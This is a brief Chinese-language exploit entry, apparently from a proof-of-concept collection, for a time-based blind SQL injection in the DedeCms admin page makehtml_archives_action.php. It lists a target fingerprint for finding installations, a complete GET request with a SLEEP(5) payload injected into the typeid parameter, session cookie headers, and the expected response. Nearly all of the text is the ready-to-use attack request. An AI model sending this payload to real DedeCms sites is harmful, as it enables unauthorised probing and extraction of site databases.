# DedeCms栏目更新处sql时间盲注

- **系统**：DedeCms　|　**类型**：其他　|　**CVE**：—
- **指纹**：`app="dedecms"`
- **请求**：`GET /dedecms/dede/makehtml_archives_action.php?typeid=1+AND+(SELECT+1+FROM+(SELECT(SLEEP(5)))a) HTTP/1.1`
- **关键头**：`Cookie: menuitems=1_1%2C2_1%2C3_1%2C4_1%2C5_1%2C6_1; last_vtime=1707197362; last_vtime1B…`
- **预期**：200　|　—